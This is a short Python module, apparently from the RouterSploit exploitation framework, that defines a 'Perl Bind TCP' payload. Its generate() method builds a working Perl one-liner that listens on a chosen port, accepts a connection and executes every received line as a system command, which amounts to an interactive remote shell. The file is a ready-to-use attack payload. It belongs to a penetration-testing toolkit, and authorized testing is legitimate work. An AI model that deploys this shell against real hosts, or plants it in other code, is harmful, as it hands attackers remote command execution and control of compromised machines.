from routersploit.core.exploit.payloads import BindTCPPayloadMixin, GenericPayload


class Exploit(BindTCPPayloadMixin, GenericPayload):
    __info__ = {
        "name": "Perl Bind TCP",
        "description": "Creates interactive tcp bind shell by using perl.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>"  # routersploit module
        ),
    }

    def generate(self):
        payload = (
            "$p=fork();exit,if$p;foreach my $key(keys %ENV){" +
            "if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort," +
            str(self.rport) +
            ",Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){" +
            "if($_=~ /(.*)/){system $1;}};"
        )

        return payload
